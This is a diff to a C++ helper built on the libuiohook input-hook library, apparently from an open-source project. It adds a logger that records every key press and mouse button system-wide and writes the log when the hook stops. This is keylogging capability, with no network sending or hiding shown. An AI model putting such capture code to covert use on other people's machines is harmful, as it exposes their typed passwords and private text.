@@ -16,20 +16,33 @@
 // with this program; if not, write to the Free Software Foundation, Inc.,
 // 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
 
+#include <vnepogodin/logger.hpp>
 #include <vnepogodin/uiohook_helper.hpp>
+#include <vnepogodin/utils.hpp>
 
 #include <cstdarg>
 #include <cstdio>
 
 #include <uiohook.h>
 
-// Native thread errors.
-#define UIOHOOK_ERROR_THREAD_CREATE 0x10
-
 namespace uiohook {
 std::atomic<bool> hook_state;
 std::mutex buffer_mutex;
-Buffer buf;
+vnepogodin::buffer buf;
+
+static vnepogodin::Logger logger;
+
+using namespace vnepogodin;
+static inline std::uint32_t handle_key(const std::uint32_t& key_stroke) {
+    for (const auto& code : utils::code_list) {
+        if (code.first == key_stroke) {
+            logger.add_key(code.second);
+            return code.first;
+        }
+    }
+
+    return utils::key_code::UNDEFINED;
+}
 
 bool logger_proc(unsigned int level, const char* format, ...) {
     bool status = false;
@@ -57,24 +70,25 @@ bool logger_proc(unsigned int level, const char* format, ...) {
 
 void dispatch_proc(uiohook_event* const event) {
     std::lock_guard<std::mutex> lock(buffer_mutex);
+
     switch (event->type) {
     case EVENT_HOOK_ENABLED:
-        // Lock the running mutex so we know if the hook is enabled.
+        // Lock the running mutex, so we know if the hook is enabled.
         hook_state = true;
         break;
-    case EVENT_MOUSE_CLICKED:
     case EVENT_MOUSE_PRESSED:
     case EVENT_MOUSE_RELEASED:
-        buf.write<uiohook_event>(*event);
-        break;
+    case EVENT_MOUSE_CLICKED:
     case EVENT_MOUSE_MOVED:
     case EVENT_MOUSE_DRAGGED:
         buf.write<uiohook_event>(*event);
+        handle_key(event->data.mouse.button);
         break;
     case EVENT_KEY_TYPED:
     case EVENT_KEY_PRESSED:
     case EVENT_KEY_RELEASED:
         buf.write<uiohook_event>(*event);
+        handle_key(event->data.keyboard.keycode);
         break;
     default:
         break;
@@ -89,11 +103,16 @@ bool start() {
 
     switch (status) {
     case UIOHOOK_SUCCESS:
+        // We no longer block, so we need to explicitly wait for the thread to die.
         hook_state = true;
         return true;
+
+    // System level errors.
     case UIOHOOK_ERROR_OUT_OF_MEMORY:
         logger_proc(LOG_LEVEL_ERROR, "[uiohook] Failed to allocate memory. (%#X)", status);
         return false;
+
+    // X11 specific errors.
     case UIOHOOK_ERROR_X_OPEN_DISPLAY:
         logger_proc(LOG_LEVEL_ERROR, "[uiohook] Failed to open X11 display. (%#X)", status);
         return false;
@@ -109,9 +128,8 @@ bool start() {
     case UIOHOOK_ERROR_X_RECORD_ENABLE_CONTEXT:
         logger_proc(LOG_LEVEL_ERROR, "[uiohook] Failed to enable XRecord context. (%#X)", status);
         return false;
-    case UIOHOOK_ERROR_SET_WINDOWS_HOOK_EX:
-        logger_proc(LOG_LEVEL_ERROR, "[uiohook] Failed to register low level windows hook. (%#X)", status);
-        return false;
+
+    // Darwin specific errors.
     case UIOHOOK_ERROR_AXAPI_DISABLED:
         logger_proc(LOG_LEVEL_ERROR, "[uiohook] Failed to enable access for assistive devices. (%#X)", status);
         return false;
@@ -140,6 +158,8 @@ void stop() {
         return;
     hook_state         = false;
     const auto& status = hook_stop();
+    logger.write();
+    logger.close();
 
     switch (status) {
     case UIOHOOK_ERROR_OUT_OF_MEMORY:
